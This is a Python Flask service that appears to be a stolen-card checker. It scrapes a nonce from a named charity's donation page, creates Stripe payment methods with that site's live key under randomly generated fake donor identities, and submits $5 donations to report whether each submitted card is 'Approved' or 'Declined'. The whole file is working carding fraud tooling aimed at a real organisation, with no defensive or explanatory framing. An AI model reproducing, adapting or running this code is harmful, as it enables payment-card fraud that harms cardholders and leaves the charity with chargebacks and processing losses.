from flask import Flask, request, jsonify
import requests
from bs4 import BeautifulSoup
import random
import string
import json
import re

app = Flask(__name__)

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_random_user():
    first = random_string(5).capitalize()
    last = random_string(7).capitalize()
    email = f"{first.lower()}{random.randint(100,999)}@gmail.com"
    phone = f"+1 5{random.randint(10000,99999)}-{random.randint(100,999)}-{random.randint(1000,9999)}"
    return first, last, email, phone

def get_nonce():
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
    }
    
    try:
        r = requests.get("https://pipelineforchangefoundation.com/donate/", headers=headers, timeout=10)
        r.raise_for_status()
        soup = BeautifulSoup(r.text, "html.parser")
        
        nonce_input = soup.find("input", {"name": "_charitable_donation_nonce"})
        form_id_input = soup.find("input", {"name": "charitable_form_id"})
        
        if nonce_input and form_id_input:
            return nonce_input.get("value"), form_id_input.get("value")
        
        scripts = soup.find_all('script')
        for script in scripts:
            if script.string and 'charitable_vars' in script.string:
                match = re.search(r'_charitable_donation_nonce["\']:\s*["\']([^"\']+)', script.string)
                if match:
                    nonce = match.group(1)
                    form_match = re.search(r'charitable_form_id["\']:\s*["\']([^"\']+)', script.string)
                    form_id = form_match.group(1) if form_match else '1'
                    return nonce, form_id
        
        raise ValueError("Nonce not found in page")
        
    except Exception as e:
        print(f"Error getting nonce: {str(e)}")
        raise

def get_payment_method(card, month, year, cvv, name, email, city, address, zip, state, phone):
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }

    uid = lambda: ''.join(random.choices(string.ascii_letters + string.digits, k=36))
    payload = {
        'type': 'card',
        'billing_details[name]': name,
        'billing_details[email]': email,
        'billing_details[address][city]': city,
        'billing_details[address][country]': 'US',
        'billing_details[address][line1]': address,
        'billing_details[address][postal_code]': zip,
        'billing_details[address][state]': state,
        'billing_details[phone]': phone,
        'card[number]': card,
        'card[cvc]': cvv,
        'card[exp_month]': month,
        'card[exp_year]': year,
        'guid': uid(),
        'muid': uid(),
        'sid': uid(),
        'payment_user_agent': 'stripe.js%2Fc0b5539ba7%3B+stripe-js-v3%2Fc0b5539ba7%3B+card-element',
        'referrer': 'https://pipelineforchangefoundation.com',
        'time_on_page': '67213',
        'key': 'pk_live_51IK8KECy7gKATUV9t1d0t32P2r0P54BYaeaROb0vL6VdMJzkTpvZc6sIx1W7bKXwEWiH7iQT3gZENUMkYrdvlTte00PxlESxxt'
    }

    res = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers, data=payload)
    try:
        return res.json().get("id"), res.json(), res.status_code
    except:
        return None, {"error": "Stripe response error", "raw_response": res.text}, res.status_code

def make_donation(payment_method_id, nonce, form_id, fname, lname, email, phone, address, city, state, zip):
    headers = {
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Referer': 'https://pipelineforchangefoundation.com/donate/',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'charitable_form_id': form_id,
        form_id: '',
        '_charitable_donation_nonce': nonce,
        '_wp_http_referer': '/donate/',
        'campaign_id': '690',
        'description': 'Donate to Pipeline for Change Foundation',
        'ID': '0',
        'recurring_donation': 'once',
        'custom_recurring_donation_amount': '',
        'recurring_donation_period': 'once',
        'donation_amount': 'custom',
        'custom_donation_amount': '5.00',
        'first_name': fname,
        'last_name': lname,
        'email': email,
        'address': address,
        'address_2': 'N/A',
        'city': city,
        'state': state,
        'postcode': zip,
        'country': 'US',
        'phone': phone,
        'gateway': 'stripe',
        'stripe_payment_method': payment_method_id,
        'action': 'make_donation',
        'form_action': 'make_donation',
    }

    res = requests.post("https://pipelineforchangefoundation.com/wp-admin/admin-ajax.php", headers=headers, data=data)
    return res.text, res.status_code

@app.route('/gate=pipeline/key=<key>/cc=<cc>')
def checker(key, cc):
    try:
        card, mm, yyyy, cvv = cc.strip().split('|')
    except:
        return jsonify({'status': 'Declined', 'response': 'Invalid card format. Use CC|MM|YYYY|CVV'}), 400
    fname, lname, email, phone = generate_random_user()
    city = "New York"
    address = "123 Main St"
    zip = "10001"
    state = "NY"
    try:
        nonce, form_id = get_nonce()
    except Exception as e:
        return jsonify({
            'status': 'Declined',
            'response': 'Unable to get nonce',
            'error_details': str(e),
            'solution': 'The website may have changed its structure. Manual inspection needed.'
        }), 400
    payment_id, stripe_response, stripe_status = get_payment_method(
        card, mm, yyyy, cvv, f"{fname} {lname}", email, city, address, zip, state, phone
    )
    if not payment_id:
        err = stripe_response.get("error", {}).get("message", "Stripe error")
        return jsonify({
            'status': 'Declined',
            'response': err,
            'stripe_response': stripe_response,
            'stripe_status': stripe_status
        })
    donation_response, donation_status = make_donation(
        payment_id, nonce, form_id, fname, lname, email, phone, address, city, state, zip
    )
    try:
        parsed = json.loads(donation_response)
        if isinstance(parsed, str):
            parsed = json.loads(parsed)
        if parsed.get("success"):
            if parsed.get("requires_action"):
                status = "Approved"
                message = "OTP_REQUIRED"
            else:
                status = "Approved"
                message = "Payment Successful"
        else:
            status = "Declined"
            errors = parsed.get("errors", ["Unknown error"])
            message = " ".join(errors)  # Join all error messages into a single string
    except Exception as e:
        status = "Declined"
        message = f"Parse Error: {str(e)}"
    return jsonify({
        "status": status,
        "response": message  # Now only the clean error message(s) are returned
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8500, debug=True)
